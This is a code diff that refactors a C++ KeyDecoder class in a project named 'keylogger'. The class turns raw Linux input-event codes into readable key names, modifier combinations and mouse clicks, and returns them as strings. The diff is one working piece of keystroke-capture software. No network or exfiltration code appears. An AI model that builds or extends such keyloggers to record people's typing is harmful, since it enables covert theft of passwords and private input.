@@ -1,8 +1,6 @@
-//
-// Created by ofir on 7/24/25.
-//
 
 #include <linux/input.h>
+
 #include "KeyDecoder.hpp"
 
 
@@ -58,9 +56,6 @@ const std::unordered_map<int, std::string> keylogger::KeyDecoder::m_shifted_mapp
     {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"}
 };
 
-keylogger::KeyDecoder::KeyDecoder(Logger& logger) : m_logger(logger)
-{}
-
 std::string keylogger::KeyDecoder::GetKeyName(int code, bool shifted) const
 {
     if (!m_key_mappings.contains(code))
@@ -99,53 +94,54 @@ std::string keylogger::KeyDecoder::GetMouseButtonName(int code)
     return "[MOUSE_UNKNOWN:" + std::to_string(code) + "]";
 }
 
-void keylogger::KeyDecoder::ProcessMouseEvent(int code, int value) const
+std::string keylogger::KeyDecoder::ProcessMouseEvent(KeyEvent ev)
 {
-    if (value != 1)
+    if (ev.value != 1)
     {
-        return; // Only log button presses
+        return ""; // Only log button presses
     }
 
-    const std::string button_name = GetMouseButtonName(code);
-    m_logger.Log("Mouse: " + button_name + " CLICK");
+    const std::string button_name = GetMouseButtonName(ev.code);
+    return {"Mouse: " + button_name + " CLICK"};
 }
 
 //TODO Fix!
-void keylogger::KeyDecoder::ProcessKeyEvent(int code, int value)
+std::string keylogger::KeyDecoder::ProcessKeyEvent(KeyEvent ev)
 {
     // Update modifier states
-    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL)
+    if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL)
     {
-        m_ctrl_pressed = (value == 1 || value == 2);  // 1=press, 2=repeat
+        m_ctrl_pressed = (ev.value == 1 || ev.value == 2);  // 1=press, 2=repeat
     }
-    else if (code == KEY_LEFTALT || code == KEY_RIGHTALT)
+    else if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT)
     {
-        m_alt_pressed = (value == 1 || value == 2);
+        m_alt_pressed = (ev.value == 1 || ev.value == 2);
     }
-    else if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
+    else if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT)
     {
-        m_shift_pressed = (value == 1 || value == 2);
+        m_shift_pressed = (ev.value == 1 || ev.value == 2);
     }
-    else if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA)
+    else if (ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA)
     {
-        m_meta_pressed = (value == 1 || value == 2);
+        m_meta_pressed = (ev.value == 1 || ev.value == 2);
     }
-    else if (code == KEY_CAPSLOCK && value == 1)
+    else if (ev.code == KEY_CAPSLOCK && ev.value == 1)
     {
         m_caps_lock = !m_caps_lock; // Toggle on key press
-        m_logger.Log("Modifier: [CAPSLOCK] " + std::string(m_caps_lock ? "ON" : "OFF"));
+        return {"Modifier: [CAPSLOCK] " + std::string(m_caps_lock ? "ON" : "OFF")};
     }
 
     // Only log key presses (ignore releases and repeats for non-modifiers)
-    if (value != 1 &&
-        code != KEY_LEFTCTRL && code != KEY_RIGHTCTRL &&
-        code != KEY_LEFTALT && code != KEY_RIGHTALT &&
-        code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT &&
-        code != KEY_LEFTMETA && code != KEY_RIGHTMETA) {
-        return;
+    if (ev.value != 1 &&
+        ev.code != KEY_LEFTCTRL && ev.code != KEY_RIGHTCTRL &&
+        ev.code != KEY_LEFTALT && ev.code != KEY_RIGHTALT &&
+        ev.code != KEY_LEFTSHIFT && ev.code != KEY_RIGHTSHIFT &&
+        ev.code != KEY_LEFTMETA && ev.code != KEY_RIGHTMETA)
+        {
+            return "";
         }
 
-    const std::string key_name = GetKeyName(code, m_shift_pressed);
+    const std::string key_name = GetKeyName(ev.code, m_shift_pressed);
 
     // Build combination string
     std::string combination;
@@ -164,12 +160,24 @@ void keylogger::KeyDecoder::ProcessKeyEvent(int code, int value)
     combination += key_name;
 
     // Special handling for modifier-only events
-    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL ||
-        code == KEY_LEFTALT || code == KEY_RIGHTALT ||
-        code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT ||
-        code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
-        m_logger.Log("Modifier: " + combination + (value == 1 ? " PRESSED" : " RELEASED"));
-        } else {
-            m_logger.Log("Key: " + combination);
-        }
+    if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL ||
+        ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT ||
+        ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT ||
+        ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA)
+    {
+        return {"Modifier: " + combination + (ev.value == 1 ? " PRESSED" : " RELEASED")};
+    }
+    else
+    {
+        return {"Key: " + combination};
+    }
+}
+
+std::string keylogger::KeyDecoder::Decode(KeyEvent ev)
+{
+    if (ev.code >= BTN_MOUSE && ev.code <= BTN_JOYSTICK)
+    {
+        return ProcessMouseEvent(ev);
+    }
+    return ProcessKeyEvent(ev);
 }
